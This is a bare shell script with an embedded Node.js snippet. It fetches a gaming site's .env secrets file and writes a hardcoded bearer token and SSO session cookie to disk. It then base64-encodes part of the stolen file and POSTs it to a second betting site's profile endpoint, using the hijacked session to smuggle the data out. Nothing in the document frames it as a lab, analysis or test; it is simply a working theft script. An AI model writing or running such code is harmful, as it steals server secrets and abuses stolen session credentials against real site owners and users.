#!/bin/sh
curl -s -o /w3 https://playerapi.hubgaming.com/.env
printf '%s' 'bearer=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5Mjk4ODk2NywiZXhwIjoxNzkzMTYxNzY3LCJuYmYiOjE3OTI5ODg5NjcsImp0aSI6IlVVMmh6THRQamlDMndKbXciLCJzdWIiOiIxMDEzMTMwNiIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.tBx_DhqzB2tPYHg83YqHidXtLWlLPZN1uk1PE8yEcFo; SSOSessionInfo_90006999=Tya3diIoQPLwA38R6fe6vWsw8vslLYQoCpjZ16zcN89ul1MJuqFVrNxbxbXrLrP2nw49N9ZBtUCJHwoQWtOuTXKNRDXnLo5Kvy6BggGxPBBvcvVUoMPUxAl3AIaGH3ZGejMPk/YfXXvOjugI1xaBAvYDmRO798M87OGeH3mdv+4KUKpZxL5C59xM5UzQJ+qx5pGGF22j/lVm4OhwlQ8Sc+BN0FoOQDXPlqv6EcETsYf+x6iUMSdrb3O7TSfy+TZ9' > /jwt.txt
cat > /na.js <<'XEOF'
f=require("fs")
w=f.writeFileSync
t=f.readFileSync("/jwt.txt","utf8")
d=f.readFileSync("/w3").toString("base64")
c1=d.substring(0,255)
p={residential:c1}
b=JSON.stringify(p)
q=require("https").request
o={host:"titobet.com"}
o.method="POST"
o.path="/api/user/profile"
o.headers={Origin:"https://titobet.com"}
o.headers.cookie=t
o.headers["content-type"]="application/json"
k=x=>w("/okJ",""+x.statusCode)
r=q(o,k)
r.on("error",e=>w("/oJE",e.code))
r.end(b)
XEOF
node /na.js
[ "$(cat /okJ)" = 200 ]&&sleep 25
sleep 12
